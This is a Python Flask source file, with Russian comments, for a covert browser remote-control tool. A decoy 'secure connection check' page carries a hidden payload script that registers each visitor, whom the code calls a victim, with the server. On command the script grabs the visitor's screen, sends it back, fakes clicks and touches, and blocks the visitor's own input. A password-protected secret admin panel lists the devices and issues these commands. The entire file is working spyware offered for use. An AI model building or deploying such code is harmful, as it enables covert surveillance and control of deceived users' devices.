import asyncio
import json
import os
import time
import base64
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, send_from_directory
from flask_sock import Sock
from werkzeug.security import check_password_hash, generate_password_hash

app = Flask(__name__)
sock = Sock(app)

# ========== Хранилище ==========
devices = {}          # device_id -> { "ws": websocket, "type": "pc/phone/tablet", "last_seen": timestamp, "nick": str, "screen": last_base64, "mouse_blocked": bool }
admin_sessions = {}   # session_token -> device_id (кто кого смотрит)
ADMIN_PASSWORD_HASH = generate_password_hash("DDS_MrL_2026")  # смени на свой

# ========== Маскировочная страница (для жертвы) ==========
MASK_PAGE = '''
<!DOCTYPE html>
<html>
<head>
  <title>Проверка защищённого соединения</title>
  <style>
    body{background:#0b0e1a;color:#c0caf5;font-family:'Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;flex-direction:column;}
    .loader{width:60px;height:60px;border:4px solid #2a2f4a;border-top:4px solid #7aa2f7;border-radius:50%;animation:spin 1.2s cubic-bezier(0.5,0,0.5,1) infinite;}
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    .status{color:#565f89;margin-top:20px;letter-spacing:2px;font-size:14px;}
    .hidden{display:none;}
  </style>
</head>
<body>
  <div class="loader"></div>
  <div class="status">Установка защищённого канала...</div>
  <script>
    // ===== ПАЙЛОАД =====
    (function() {
      const WS_URL = "wss://"+location.host+"/ws";
      let ws = new WebSocket(WS_URL);
      const deviceId = localStorage.getItem("dds_id") || crypto.randomUUID();
      localStorage.setItem("dds_id", deviceId);
      let deviceType = "pc";
      if(/android|iphone|ipad|tablet/i.test(navigator.userAgent)) deviceType = "tablet";
      if(/mobile/i.test(navigator.userAgent) && !/tablet/i.test(navigator.userAgent)) deviceType = "phone";

      ws.onopen = () => {
        ws.send(JSON.stringify({type:"register", id:deviceId, deviceType:deviceType}));
        document.querySelector(".status").innerText = "Соединение установлено";
        setTimeout(()=>document.querySelector(".loader").classList.add("hidden"), 1500);
      };

      // === Скрытая камера/экран (только если запрошено) ===
      let screenStream = null;
      async function captureScreen() {
        try {
          const stream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 5 }, audio: false });
          screenStream = stream;
          const track = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(track);
          const bitmap = await imageCapture.grabFrame();
          const canvas = document.createElement("canvas");
          canvas.width = Math.min(bitmap.width, 1024);
          canvas.height = Math.min(bitmap.height, 768);
          const ctx = canvas.getContext("2d");
          ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
          const dataUrl = canvas.toDataURL("image/jpeg", 0.5);
          ws.send(JSON.stringify({type:"screen", data:dataUrl, id:deviceId}));
          track.stop();
          stream.getTracks().forEach(t=>t.stop());
        } catch(e){}
      }

      // === Управление мышью / тач ===
      function injectMouseMove(x, y) {
        const ev = new MouseEvent("mousemove", { clientX: x, clientY: y, bubbles: true });
        document.dispatchEvent(ev);
      }
      function injectClick(x, y) {
        const ev = new MouseEvent("click", { clientX: x, clientY: y, bubbles: true });
        document.dispatchEvent(ev);
      }
      function injectTouch(x, y) {
        const touch = new Touch({ identifier: 0, target: document.body, clientX: x, clientY: y, pageX: x, pageY: y });
        const ev = new TouchEvent("touchstart", { touches: [touch], changedTouches: [touch], bubbles: true });
        document.dispatchEvent(ev);
      }

      // === Блокировка мыши/тача ===
      let mouseBlocked = false;
      function blockMouse(enable) {
        mouseBlocked = enable;
        if(enable) {
          document.body.style.pointerEvents = "none";
          document.addEventListener("mousedown", (e)=>e.preventDefault(), true);
          document.addEventListener("touchstart", (e)=>e.preventDefault(), true);
        } else {
          document.body.style.pointerEvents = "auto";
        }
      }

      // === Обработка команд от сервера ===
      ws.onmessage = (e) => {
        const data = JSON.parse(e.data);
        if(data.type === "mouse_move") {
          injectMouseMove(data.x, data.y);
        } else if(data.type === "click") {
          injectClick(data.x, data.y);
        } else if(data.type === "touch") {
          injectTouch(data.x, data.y);
        } else if(data.type === "block_mouse") {
          blockMouse(true);
        } else if(data.type === "unblock_mouse") {
          blockMouse(false);
        } else if(data.type === "capture_screen") {
          captureScreen();
        } else if(data.type === "ping") {
          ws.send(JSON.stringify({type:"pong", id:deviceId}));
        }
      };

      // === Пинг ===
      setInterval(() => {
        if(ws.readyState === 1) ws.send(JSON.stringify({type:"ping", id:deviceId}));
      }, 15000);

      // === Переподключение ===
      ws.onclose = () => {
        document.querySelector(".status").innerText = "Переподключение...";
        setTimeout(() => { window.location.reload(); }, 3000);
      };
    })();
  </script>
</body>
</html>
'''

# ========== СЕКРЕТНАЯ АДМИН-ПАНЕЛЬ ==========
ADMIN_PANEL = '''
<!DOCTYPE html>
<html>
<head>
  <title>DDS_MrL Control</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0d1117;color:#c9d1d9;font-family:'Courier New',monospace;padding:20px;}
    .container{max-width:1400px;margin:auto;}
    h1{color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px;margin-bottom:20px;}
    .device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:15px;}
    .device-card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:15px;position:relative;}
    .device-card.online{border-color:#2ea043;}
    .device-card.offline{border-color:#da3633;opacity:0.5;}
    .device-id{font-size:12px;color:#8b949e;word-break:break-all;}
    .device-type{display:inline-block;background:#21262d;padding:2px 10px;border-radius:12px;font-size:11px;}
    .device-actions{margin-top:12px;display:flex;flex-wrap:wrap;gap:5px;}
    .device-actions button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:4px 12px;border-radius:6px;cursor:pointer;font-size:12px;}
    .device-actions button:hover{background:#30363d;}
    .device-actions .danger{color:#f85149;border-color:#f85149;}
    .device-actions .primary{color:#58a6ff;border-color:#58a6ff;}
    .screen-preview{max-width:100%;margin-top:10px;border-radius:6px;border:1px solid #30363d;}
    .login-box{background:#161b22;padding:40px;border-radius:12px;max-width:400px;margin:100px auto;text-align:center;}
    .login-box input{width:100%;padding:12px;margin:10px 0;background:#0d1117;border:1px solid #30363d;color:#fff;border-radius:6px;}
    .login-box button{background:#238636;border:none;padding:12px 30px;border-radius:6px;color:#fff;font-weight:bold;cursor:pointer;}
    .viewer-area{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:15px;margin-top:20px;}
    .viewer-area img{max-width:100%;border-radius:6px;}
    .flex-row{display:flex;gap:20px;flex-wrap:wrap;}
    .flex-row > *{flex:1;}
  </style>
</head>
<body>
<div class="container" id="app">
  <div v-if="!logged">
    <div class="login-box">
      <h2>🔐 DDS_MrL Console</h2>
      <input type="password" v-model="password" placeholder="Пароль доступа" @keyup.enter="login()">
      <button @click="login()">Войти</button>
      <p style="color:#8b949e;font-size:12px;margin-top:10px;">Секретный вход</p>
    </div>
  </div>
  <div v-else>
    <h1>🛸 DDS_MrL — Управление устройствами</h1>
    <div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:15px;">
      <span style="background:#21262d;padding:4px 14px;border-radius:20px;">🟢 {{ onlineCount }} онлайн</span>
      <span style="background:#21262d;padding:4px 14px;border-radius:20px;">📱 {{ phoneCount }} телефонов</span>
      <span style="background:#21262d;padding:4px 14px;border-radius:20px;">💻 {{ pcCount }} ПК</span>
      <span style="background:#21262d;padding:4px 14px;border-radius:20px;">📟 {{ tabletCount }} планшетов</span>
    </div>
    <div class="device-grid">
      <div v-for="(dev, id) in devices" :key="id" class="device-card" :class="dev.online ? 'online' : 'offline'">
        <div><span class="device-type">{{ dev.deviceType }}</span> <span style="float:right;font-size:11px;">{{ dev.online ? '🟢' : '🔴' }}</span></div>
        <div class="device-id">{{ id.slice(0,8) }}...{{ id.slice(-4) }}</div>
        <div style="font-size:12px;color:#8b949e;">{{ dev.nick || 'Без имени' }}</div>
        <div style="font-size:10px;color:#484f58;">последний: {{ dev.last_seen }}</div>
        <div class="device-actions">
          <button class="primary" @click="captureScreen(id)">📸 Скрин</button>
          <button class="primary" @click="viewDevice(id)">👁️ Смотреть</button>
          <button class="danger" @click="blockMouse(id, true)">🖱️ Заблок.</button>
          <button @click="blockMouse(id, false)">🖱️ Разблок.</button>
          <button @click="sendClick(id, 100, 100)">🔘 Клик</button>
          <button @click="moveMouse(id, 200, 200)">⬆️ Двиг</button>
        </div>
        <img v-if="dev.screen" :src="dev.screen" class="screen-preview" />
      </div>
    </div>
    <div v-if="currentView" class="viewer-area">
      <h3>Просмотр: {{ currentView }}</h3>
      <div class="flex-row">
        <div>
          <img :src="viewerScreen" v-if="viewerScreen" />
          <p v-else>Нет скрина, нажмите "Скрин"</p>
        </div>
        <div style="display:flex;flex-direction:column;gap:10px;">
          <button @click="captureScreen(currentView)">Обновить экран</button>
          <button class="danger" @click="blockMouse(currentView, true)">Заблокировать мышь</button>
          <button @click="blockMouse(currentView, false)">Разблокировать мышь</button>
          <div>Координаты мыши <input v-model="mx" type="number" style="width:60px;"> x <input v-model="my" type="number" style="width:60px;"></div>
          <button @click="moveMouse(currentView, parseInt(mx), parseInt(my))">Переместить</button>
          <button @click="sendClick(currentView, parseInt(mx), parseInt(my))">Клик</button>
        </div>
      </div>
    </div>
  </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.min.js"></script>
<script>
new Vue({
  el: '#app',
  data: {
    password: '',
    logged: false,
    devices: {},
    currentView: null,
    viewerScreen: null,
    mx: 500,
    my: 300,
    ws: null,
    sessionId: crypto.randomUUID()
  },
  computed: {
    onlineCount() { return Object.values(this.devices).filter(d => d.online).length; },
    phoneCount() { return Object.values(this.devices).filter(d => d.deviceType === 'phone' && d.online).length; },
    pcCount() { return Object.values(this.devices).filter(d => d.deviceType === 'pc' && d.online).length; },
    tabletCount() { return Object.values(this.devices).filter(d => d.deviceType === 'tablet' && d.online).length; }
  },
  methods: {
    login() {
      fetch('/admin/login', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({password: this.password})
      }).then(r => r.json()).then(data => {
        if(data.ok) {
          this.logged = true;
          this.connectWS();
        } else alert('Неверный пароль');
      });
    },
    connectWS() {
      this.ws = new WebSocket('wss://'+location.host+'/admin/ws');
      this.ws.onopen = () => {
        this.ws.send(JSON.stringify({type:'admin_register', session:this.sessionId}));
      };
      this.ws.onmessage = (e) => {
        const data = JSON.parse(e.data);
        if(data.type === 'devices_list') {
          this.devices = data.devices;
        } else if(data.type === 'device_update') {
          Vue.set(this.devices, data.id, data.data);
        } else if(data.type === 'screen_update') {
          if(this.currentView === data.id) this.viewerScreen = data.screen;
          if(this.devices[data.id]) Vue.set(this.devices[data.id], 'screen', data.screen);
        } else if(data.type === 'device_offline') {
          if(this.devices[data.id]) Vue.set(this.devices[data.id], 'online', false);
        }
      };
      this.ws.onclose = () => setTimeout(this.connectWS, 3000);
    },
    sendCmd(id, cmd, payload) {
      if(this.ws && this.ws.readyState === 1) {
        this.ws.send(JSON.stringify({type:'cmd', target:id, cmd:cmd, ...payload}));
      }
    },
    captureScreen(id) { this.sendCmd(id, 'capture_screen'); },
    blockMouse(id, block) { this.sendCmd(id, block ? 'block_mouse' : 'unblock_mouse'); },
    moveMouse(id, x, y) { this.sendCmd(id, 'mouse_move', {x, y}); },
    sendClick(id, x, y) { this.sendCmd(id, 'click', {x, y}); },
    viewDevice(id) {
      this.currentView = id;
      this.viewerScreen = this.devices[id]?.screen || null;
      if(this.devices[id]?.screen) this.viewerScreen = this.devices[id].screen;
    }
  }
});
</script>
</body>
</html>
'''

# ========== Flask Routes ==========

@app.route('/')
def mask():
    return MASK_PAGE

@app.route('/admin')
def admin_panel():
    return ADMIN_PANEL

@app.route('/admin/login', methods=['POST'])
def admin_login():
    data = request.json
    if data and check_password_hash(ADMIN_PASSWORD_HASH, data.get('password', '')):
        return jsonify({'ok': True})
    return jsonify({'ok': False}), 401

# ========== WebSocket для устройств (жертвы) ==========
@sock.route('/ws')
def device_ws(ws):
    device_id = None
    try:
        while True:
            msg = ws.receive()
            data = json.loads(msg)
            if data.get('type') == 'register':
                device_id = data['id']
                dev_type = data.get('deviceType', 'pc')
                devices[device_id] = {
                    'ws': ws,
                    'deviceType': dev_type,
                    'last_seen': datetime.now().isoformat(),
                    'online': True,
                    'screen': None,
                    'nick': None,
                    'mouse_blocked': False
                }
                broadcast_devices()
            elif data.get('type') == 'ping' and device_id:
                if device_id in devices:
                    devices[device_id]['last_seen'] = datetime.now().isoformat()
                    devices[device_id]['online'] = True
                    broadcast_devices()
            elif data.get('type') == 'screen' and device_id:
                if device_id in devices:
                    devices[device_id]['screen'] = data['data']
                    # шлём админам, кто смотрит это устройство
                    for admin_ws in admin_sessions.values():
                        try:
                            admin_ws.send(json.dumps({
                                'type': 'screen_update',
                                'id': device_id,
                                'screen': data['data']
                            }))
                        except: pass
            elif data.get('type') == 'pong' and device_id:
                if device_id in devices:
                    devices[device_id]['last_seen'] = datetime.now().isoformat()
                    devices[device_id]['online'] = True
    except:
        if device_id and device_id in devices:
            devices[device_id]['online'] = False
            broadcast_devices()

# ========== WebSocket для админа ==========
@sock.route('/admin/ws')
def admin_ws(ws):
    session = None
    try:
        while True:
            msg = ws.receive()
            data = json.loads(msg)
            if data.get('type') == 'admin_register':
                session = data.get('session')
                admin_sessions[session] = ws
                # отправить текущий список
                ws.send(json.dumps({
                    'type': 'devices_list',
                    'devices': {k: {**v, 'ws': None} for k, v in devices.items()}
                }))
            elif data.get('type') == 'cmd' and session:
                target = data.get('target')
                if target in devices and devices[target]['online']:
                    dev_ws = devices[target]['ws']
                    try:
                        dev_ws.send(json.dumps({
                            'type': data.get('cmd'),
                            'x': data.get('x', 0),
                            'y': data.get('y', 0)
                        }))
                    except:
                        devices[target]['online'] = False
                        broadcast_devices()
    except:
        if session and session in admin_sessions:
            del admin_sessions[session]

def broadcast_devices():
    # отправить всем админам обновлённый список
    data = {
        'type': 'devices_list',
        'devices': {k: {**v, 'ws': None} for k, v in devices.items()}
    }
    for ws in list(admin_sessions.values()):
        try:
            ws.send(json.dumps(data))
        except: pass

# ========== Запуск ==========
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
